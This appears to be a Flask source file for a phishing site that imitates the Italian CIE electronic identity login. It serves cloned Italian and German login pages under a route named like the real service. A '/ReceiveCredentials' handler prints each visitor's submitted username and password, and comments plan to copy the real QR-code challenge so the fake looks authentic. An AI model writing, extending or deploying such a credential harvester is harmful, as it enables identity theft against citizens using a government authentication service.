from flask import Flask, render_template, request

app = Flask(__name__)

# TODO:
# - implement qr code CIE login
# - implement actual login
# - remove hardcoded challenges and similar. They will all be sent as parameters
# - how to make "Credenziali non valide" appear on wrong username/psw


# QR code functioning:
# when we press "login with CIE", we get redirected to a login page
# with some parameters, one of them being the challenge. With this
# challenge the website generates the QR code (qr source is @ line
# 490 in login_cie.html). Perhaps the best course of action is to 
# simply do the login and pass that field as argument to login_cie,
# so that it can display the correct QR code


@app.route('/')
def landing_page():
    return render_template('landing_page.html')


@app.route('/AuthRequestCieService/', methods=['GET', 'POST'])
def login_cie():
    lang = request.args.get('lang') 

    if lang == "deu":
        return render_template("login_cie_deu.html")
    return render_template("login_cie.html")


@app.route('/ReceiveCredentials', methods=['POST'])
def receive():
    lang = request.form.get('lang')
    print(f"Username is {request.form.get('username')}")
    print(f"Password is {request.form.get('password')}")
    print(f"Lang is {lang}")

    if lang == "deu":
        return render_template("cie_waiting_deu.html")

    return render_template("cie_waiting.html")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
